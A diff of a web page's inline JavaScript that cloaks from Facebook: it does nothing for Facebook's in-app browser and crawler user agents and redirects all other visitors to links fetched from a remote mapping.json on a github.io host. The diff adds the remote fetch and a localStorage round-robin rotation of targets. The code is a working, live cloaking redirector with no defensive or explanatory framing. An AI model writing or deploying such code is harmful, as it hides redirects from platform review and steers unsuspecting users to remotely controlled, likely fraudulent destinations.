@@ -1,18 +1,7 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<meta name="robots" content="noindex,nofollow">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-body{display:none;margin:0;}
-</style>
 <script>
 (async () => {
-
   const ua = navigator.userAgent || "";
 
-  // detect FB — no jump
   if (
     ua.includes("FBAN") || 
     ua.includes("FBAV") || 
@@ -22,24 +11,17 @@ body{display:none;margin:0;}
   ) return;
 
   try {
-    const res = await fetch("/mapping.json?ts=" + Date.now(), { cache:"no-store" });
+    const res = await fetch("https://liuhongliang11895.github.io/888/mapping.json?ts=" + Date.now(), {cache:"no-store"});
     const data = await res.json();
     const links = data.links.filter(x => x.active);
     if(!links.length) return;
 
-    const url = links[Math.floor(Math.random()*links.length)].url;
+    let idx = Number(localStorage.getItem("RR") || "0");
+    const url = links[idx % links.length].url;
+    localStorage.setItem("RR", idx + 1);
 
-    if (/iPhone|iPad|iPod/i.test(ua)) {
-      location.href = url;
-      return;
-    }
-
-    // android
     location.href = url;
 
   } catch(e){}
 })();
 </script>
-</head>
-<body></body>
-</html>
